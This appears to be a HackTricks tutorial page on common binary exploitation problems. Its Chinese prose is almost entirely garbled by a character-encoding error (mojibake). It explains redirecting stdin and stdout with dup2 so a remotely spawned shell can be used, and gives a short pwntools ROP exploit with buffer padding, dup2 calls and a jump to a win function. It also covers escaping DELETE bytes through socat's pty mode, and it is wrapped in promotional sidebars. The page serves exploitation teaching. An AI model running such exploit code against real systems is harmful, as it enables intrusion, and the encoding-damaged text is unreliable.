# å¸¸è§çš„åˆ©ç”¨é—®é¢˜

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

* æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿ æƒ³è¦çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­å®£ä¼ **å—ï¼Ÿ æˆ–è€…æƒ³è¦è®¿é—®**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Ÿ è¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[NFTæ”¶è—å“](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter**ä¸Šå…³æ³¨æˆ‘ ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘** [**hacktricksä»“åº“**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloudä»“åº“**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## è¿œç¨‹åˆ©ç”¨ä¸­çš„æ–‡ä»¶æè¿°ç¬¦

å½“å‘è°ƒç”¨**`system('/bin/sh')`**çš„è¿œç¨‹æœåŠ¡å™¨å‘é€åˆ©ç”¨æ—¶ï¼Œè¿™å°†åœ¨æœåŠ¡å™¨è¿›ç¨‹ä¸­æ‰§è¡Œï¼Œ`/bin/sh`å°†æœŸæœ›ä»stdinï¼ˆFDï¼š`0`ï¼‰æ¥æ”¶è¾“å…¥ï¼Œå¹¶å°†è¾“å‡ºæ‰“å°åœ¨stdoutå’Œstderrä¸­ï¼ˆFDs `1`å’Œ`2`ï¼‰ã€‚ å› æ­¤ï¼Œæ”»å‡»è€…å°†æ— æ³•ä¸shellè¿›è¡Œäº¤äº’ã€‚

ä¿®å¤æ­¤é—®é¢˜çš„ä¸€ç§æ–¹æ³•æ˜¯å‡è®¾æœåŠ¡å™¨å¯åŠ¨æ—¶åˆ›å»ºäº†**FDç¼–å·`3`**ï¼ˆç”¨äºç›‘å¬ï¼‰ï¼Œç„¶åï¼Œæ‚¨çš„è¿æ¥å°†åœ¨**FDç¼–å·`4`**ä¸­ã€‚ å› æ­¤ï¼Œå¯ä»¥ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨**`dup2`**å°†stdinï¼ˆFD 0ï¼‰å’Œstdoutï¼ˆFD 1ï¼‰å¤åˆ¶åˆ°FD 4ï¼ˆæ”»å‡»è€…è¿æ¥çš„FDï¼‰ï¼Œä»è€Œä½¿å¾—ä¸€æ—¦æ‰§è¡Œåå¯ä»¥è”ç³»shellã€‚ 

[**è¿™é‡Œçš„åˆ©ç”¨ç¤ºä¾‹**](https://ir0nstone.gitbook.io/notes/types/stack/exploiting-over-sockets/exploit):
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = remote('localhost', 9001)

rop = ROP(elf)
rop.raw('A' * 40)
rop.dup2(4, 0)
rop.dup2(4, 1)
rop.win()

p.sendline(rop.chain())
p.recvuntil('Thanks!\x00')
p.interactive()
```
## Socat & pty

è¯·æ³¨æ„ï¼Œsocatå·²ç»å°†**`stdin`**å’Œ**`stdout`**ä¼ è¾“åˆ°å¥—æ¥å­—ã€‚ä½†æ˜¯ï¼Œ`pty`æ¨¡å¼**åŒ…æ‹¬DELETEå­—ç¬¦**ã€‚å› æ­¤ï¼Œå¦‚æœæ‚¨å‘é€`\x7f`ï¼ˆ`DELETE`-ï¼‰ï¼Œå®ƒå°†**åˆ é™¤æ‚¨çš„åˆ©ç”¨ç¨‹åºçš„å‰ä¸€ä¸ªå­—ç¬¦**ã€‚

ä¸ºäº†ç»•è¿‡è¿™ä¸ªé—®é¢˜ï¼Œå¿…é¡»åœ¨å‘é€ä»»ä½•`\x7f`ä¹‹å‰æ·»åŠ **è½¬ä¹‰å­—ç¬¦`\x16`**ã€‚

**åœ¨è¿™é‡Œä½ å¯ä»¥** [**æ‰¾åˆ°è¿™ç§è¡Œä¸ºçš„ç¤ºä¾‹**](https://ir0nstone.gitbook.io/hackthebox/challenges/pwn/dream-diary-chapter-1/unlink-exploit)**ã€‚**

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

* æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿ æ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­è¢«å¹¿å‘Š**å—ï¼Ÿ æˆ–è€…æ‚¨æƒ³è®¿é—®**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿ è¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) **Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ–**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter**ä¸Šå…³æ³¨æˆ‘ ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* é€šè¿‡å‘**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
